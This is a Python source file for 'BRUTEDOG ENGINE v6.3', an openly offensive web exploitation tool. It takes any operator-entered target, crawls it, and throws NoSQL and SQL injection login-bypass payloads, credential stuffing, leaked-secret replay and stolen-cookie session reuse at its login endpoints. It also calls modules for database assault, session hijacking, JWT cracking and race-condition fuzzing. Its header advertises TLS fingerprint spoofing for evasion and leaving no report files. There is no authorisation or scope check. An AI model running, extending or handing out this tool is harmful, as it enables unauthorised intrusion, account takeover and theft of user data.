#!/usr/bin/env python3
"""
BRUTEDOG ENGINE v6.3 — High-Aggression Stateful Crawling & Exploitation Engine
Features:
- Integrated with centralized SecureTransport middleware (TLS 1.2/1.3 JA3/4 spoofing & behavioral jitter)
- Stateful intelligence ingestion from v6.3 crawler & DOM sink inspector
- Live autonomous test-account session propagation across exploit modules
- Interactive target selection & automated resolution
- Stateful, adaptive response-parsing and payload mutation loop
- Aggressive NoSQL/SQL time-based blind injection & data extraction
- Advanced session hijacking, JWT cracking, and cookie privilege escalation
- High-concurrency race condition and balance/state logic fuzzing
- Session-cookie security inspection
- Bounded concurrency with asyncio
- Live terminal streaming of successful exploits via telemetry module
- No report files, in-memory findings
"""
import asyncio
import json
import re
import socket
import sys
import time
from urllib.parse import urlsplit
from concurrent.futures import ThreadPoolExecutor

# Import weaponized offensive modules, transport middleware & live telemetry streamer
from modules.transport import SecureTransport
from modules.crawler import crawl_target
from modules.db_assault import run_nosql_assault
from modules.session_hijack import run_session_hijack
from modules.race_condition import run_race_condition_test
from modules.telemetry import stream_proof

# ============================================================
# CONFIGURATION
# ============================================================
REQUEST_TIMEOUT = 8
MAX_WORKERS = 5
MAX_RESPONSE_SIZE = 200_000

FALLBACK_LOGIN_PATHS = [
    "/api/auth/callback/credentials",
    "/api/auth/login",
    "/api/auth/signin",
    "/api/v1/auth/login",
    "/api/v1/users/login",
    "/api/login",
    "/api/signin",
    "/api/session",
    "/login",
    "/signin",
    "/auth/login",
    "/auth",
    "/user/login",
    "/admin/login",
    "/api/admin/login",
]

ERROR_PATTERNS = {
    "SQL syntax": re.compile(
        r"sql syntax|mysql_|pg_query|sqlite3\.|ora-009|syntax error",
        re.I,
    ),
    "MongoDB error": re.compile(
        r"mongodb|mongosh|mongoerror|bsonerror|casttoobjectid",
        re.I,
    ),
    "Database exception": re.compile(
        r"database exception|query failed|"
        r"invalid query|database error|unhandled exception",
        re.I,
    ),
}

# ============================================================
# OUTPUT COLORS & FORMATTING
# ============================================================
CYAN = "\033[96m"
GREEN = "\033[92m"
YELLOW = "\033[93m"
RED = "\033[91m"
RESET = "\033[0m"
BOLD = "\033[1m"

def info(message):
    sys.stdout.write(f"{CYAN}[*] {message}{RESET}\n")
    sys.stdout.flush()

def success(message):
    sys.stdout.write(f"{GREEN}[+] {message}{RESET}\n")
    sys.stdout.flush()

def warning(message):
    sys.stdout.write(f"{YELLOW}[!] {message}{RESET}\n")
    sys.stdout.flush()

def error(message):
    sys.stdout.write(f"{RED}[-] {message}{RESET}\n")
    sys.stdout.flush()

def section(title):
    sys.stdout.write(f"\n" + "=" * 65 + f"\n {title}\n" + "=" * 65 + "\n")
    sys.stdout.flush()

# ============================================================
# TARGET HANDLING
# ============================================================
def get_target():
    section("BRUTEDOG TARGET CONFIGURATION")
    print("Enter a domain, IP address, or server URL.")
    target = input("\nTarget: ").strip()
    if not target:
        raise ValueError("Target cannot be empty.")
    if "://" not in target:
        target = "https://" + target
    parsed = urlsplit(target)
    if parsed.scheme not in ("http", "https"):
        raise ValueError("Unsupported protocol.")
    if not parsed.hostname:
        raise ValueError("Invalid hostname.")
    return target

def resolve_target(host):
    try:
        results = socket.getaddrinfo(host, None, type=socket.SOCK_STREAM)
        return sorted({item[4][0] for item in results})
    except socket.gaierror:
        return []

# ============================================================
# ADAPTIVE RESPONSE ANALYSIS & LIVE TELEMETRY
# ============================================================
def detect_database_errors(body):
    findings = []
    for label, pattern in ERROR_PATTERNS.items():
        if pattern.search(body or ""):
            findings.append(label)
    return findings

def inspect_cookie_security(headers):
    cookie = headers.get("set-cookie", "")
    if not cookie:
        return []
    issues = []
    lower = cookie.lower()
    if "secure" not in lower:
        issues.append("Secure attribute missing")
    if "httponly" not in lower:
        issues.append("HttpOnly attribute missing")
    if "samesite" not in lower:
        issues.append("SameSite attribute missing")
    return issues

def classify_and_adapt(response, current_payload, endpoint=""):
    status = response.get("status", 0)
    body = response.get("body", "")
    headers = response.get("headers", {})
    findings = []
    mutated_payloads = []
    
    if status in [200, 201, 302] and any(k in body.lower() for k in ["token", "success", "session", "welcome", "auth", "jwt"]):
        extracted_proof = {}
        try:
            data = json.loads(body)
            if isinstance(data, dict):
                extracted_proof = {k: v for k, v in data.items() if any(sub in k.lower() for sub in ["token", "session", "cookie", "auth", "key"])}
        except:
            extracted_proof = {"raw_response_snippet": body[:200]}

        # Stream live proof-of-work immediately to the terminal
        stream_proof("AUTHENTICATION_BYPASS", endpoint, current_payload, body, extracted_proof or {"status": status})

        findings.append({
            "type": "AUTHENTICATION_BYPASS_SUCCESS",
            "evidence": f"Status {status} with valid session/token indicator",
            "status": status,
        })

    db_errors = detect_database_errors(body)
    for db_error in db_errors:
        sys.stdout.write(f"{YELLOW}[!] Adaptive Trigger: Server leaked database error ({db_error}). Mutating payload...{RESET}\n")
        sys.stdout.flush()
        findings.append({
            "type": "POTENTIAL_DATABASE_INJECTION",
            "evidence": db_error,
            "status": status,
        })
        if "MongoDB" in db_error:
            mutated_payloads.append({"username": {"$regex": "^admin.*$"}, "password": {"$ne": ""}})
        elif "SQL" in db_error:
            mutated_payloads.append({"username": "admin' UNION SELECT null, version()-- -", "password": "password"})

    for issue in inspect_cookie_security(headers):
        findings.append({
            "type": "SESSION_COOKIE_CONFIGURATION",
            "evidence": issue,
            "status": status,
        })
        
    return findings, mutated_payloads

def verify_hijacked_session(transport, endpoint):
    """
    Takes the shared transport (with stolen cookie/token jar), hits a restricted endpoint,
    and streams resulting private data live to prove the compromise.
    """
    sys.stdout.write(f"\n{YELLOW}[*] Verifying stolen session state against protected route: {endpoint}{RESET}\n")
    status, headers, body = transport.request("GET", endpoint)
    
    if status == 200 and len(body) > 50:
        stream_proof("SESSION_HIJACK_VERIFIED", endpoint, {"cookie_jar": transport.cookie_jar}, body, {"verified_status": 200})
        return True
    else:
        sys.stdout.write(f"{RED}[-] Session verification returned status {status}. Stolen session inactive.{RESET}\n")
        return False

# ============================================================
# ACTIVE ADAPTIVE ENDPOINT TESTING
# ============================================================
def test_endpoint(transport, path, credentials_list=None, leaked_secrets=None):
    endpoint = f"{transport.base_path}{path}" if not path.startswith(transport.base_path) else path
    info(f"Targeting endpoint (Stateful Adaptive Mode): {endpoint}")
    results = []
    
    test_queue = [
        {"name": "NoSQL Operator Probe", "payload": {"username": {"$ne": None}, "password": {"$ne": None}}},
        {"name": "SQLi Union Probe", "payload": {"username": "admin' OR '1'='1", "password": "password"}},
        {"name": "Admin Default Stuffing", "payload": {"username": "admin", "password": "password123"}},
        {"name": "Malformed Type Probe", "payload": {"username": {"unexpected": "object"}, "password": "password"}}
    ]

    if leaked_secrets:
        for k, v in leaked_secrets.items():
            test_queue.insert(0, {"name": f"Leaked Secret Replay ({k})", "payload": {k: v, "code": v}})

    if credentials_list and isinstance(credentials_list, list):
        for cred in credentials_list:
            if isinstance(cred, dict):
                test_queue.insert(0, {"name": "User Credential Stuffing", "payload": cred})

    executed_payloads = set()

    while test_queue:
        current_test = test_queue.pop(0)
        payload_key = json.dumps(current_test["payload"], sort_keys=True)
        if payload_key in executed_payloads:
            continue
        executed_payloads.add(payload_key)

        status, headers, body = transport.request("POST", endpoint, payload=current_test["payload"])
        if status == 0:
            continue
            
        res_obj = {"status": status, "headers": headers, "body": body}
        findings, dynamic_mutations = classify_and_adapt(res_obj, current_test["payload"], endpoint=endpoint)
        
        results.append({
            "endpoint": endpoint,
            "test": current_test["name"],
            "status": status,
            "elapsed": 0.1,
            "findings": findings,
        })

        for idx, mutant in enumerate(dynamic_mutations, 1):
            test_queue.insert(0, {
                "name": f"Adaptive Mutant #{idx}",
                "payload": mutant
            })
        
    return results

# ============================================================
# ENGINE ORCHESTRATOR
# ============================================================
async def run_autonomous_engine(target_host=None, credentials_list=None, options=None):
    section("BRUTEDOG STATEFUL OFFENSIVE EXPLOITATION ENGINE v6.3")
    try:
        if target_host:
            target_url = target_host.strip()
            if "://" not in target_url:
                target_url = "https://" + target_url
        else:
            target_url = get_target()

        parsed = urlsplit(target_url)
        host = parsed.hostname
        secure = parsed.scheme == "https"
        port = parsed.port or (443 if secure else 80)
        base_path = parsed.path.rstrip("/")
    except Exception as exc:
        error(f"Target configuration failed: {exc}")
        return [], 0.0

    protocol = "HTTPS" if secure else "HTTP"
    info(f"Target Host : {host}")
    info(f"Target Port : {port}")
    info(f"Protocol    : {protocol}")
    
    section("DNS RESOLUTION")
    addresses = resolve_target(host)
    if not addresses:
        error("DNS resolution failed.")
        return [], 0.0
    for address in addresses:
        success(f"Resolved: {address}")
        
    start = time.monotonic()
    
    # Initialize Centralized Secure Transport Wrapper (v6.3 with TLS Evasion & Behavioral Jitter)
    transport = SecureTransport(target_url)

    # 0. Stateful Dynamic Web Crawling & Auto-Provisioning
    section("STATEFUL CRAWLING & OPERATOR PROVISIONING")
    recon_data = {}
    discovered_paths = []
    leaked_secrets = {}

    try:
        recon_data = crawl_target(transport)
        if isinstance(recon_data, dict):
            discovered_paths = recon_data.get("endpoints", [])
            leaked_secrets = recon_data.get("leaked_secrets", {})
    except Exception as exc:
        warning(f"Stateful crawler encountered an issue: {exc}. Falling back to default list.")

    if not discovered_paths:
        discovered_paths = FALLBACK_LOGIN_PATHS

    if transport.cookie_jar:
        success(f"Propagating active operator session cookie across transport layer.")
        verify_hijacked_session(transport, "/dashboard")

    if leaked_secrets:
        warning(f"Discovered potential leaked JSON codes/tokens: {leaked_secrets}")

    section("ADAPTIVE ENDPOINT TESTING & MUTATION ASSAULT")
    all_results = []
    semaphore = asyncio.Semaphore(MAX_WORKERS)
    
    async def worker(path):
        async with semaphore:
            return await asyncio.to_thread(
                test_endpoint, transport, path, credentials_list, leaked_secrets
            )
            
    tasks = [asyncio.create_task(worker(path)) for path in discovered_paths]
    
    for completed in asyncio.as_completed(tasks):
        try:
            results = await completed
            if results:
                all_results.extend(results)
        except Exception as exc:
            error(f"Endpoint worker failed: {exc}")

    # 1. Aggressive Database Assault
    try:
        await run_nosql_assault(target_url, port=port, use_ssl=secure)
    except Exception as exc:
        error(f"Database assault failed: {exc}")

    # 2. Session Hijacking & Token Forging
    try:
        await run_session_hijack(target_url, port=port, use_ssl=secure)
    except Exception as exc:
        error(f"Session hijack failed: {exc}")

    # 3. High-Concurrency Race Condition & Logic Fuzzing
    try:
        await run_race_condition_test(target_url, port=port, use_ssl=secure)
    except Exception as exc:
        error(f"Race condition module failed: {exc}")
            
    duration = round(time.monotonic() - start, 2)
    
    section("ENGINE SUMMARY")
    tested = len(all_results)
    potential = sum(len(item["findings"]) for item in all_results)
    success(f"Target: {host}")
    success(f"Discovered/Scanned endpoints: {len(discovered_paths)}")
    success(f"Total adaptive requests executed: {tested}")
    success(f"Vulnerability / Exploitation hits: {potential}")
    success(f"Engine duration: {duration}s")
    section("ENGINE COMPLETE")
    return all_results, duration

if __name__ == "__main__":
    try:
        asyncio.run(run_autonomous_engine())
    except KeyboardInterrupt:
        warning("Engine interrupted by operator.")
    except Exception as exc:
        error(f"Engine failure: {exc}")

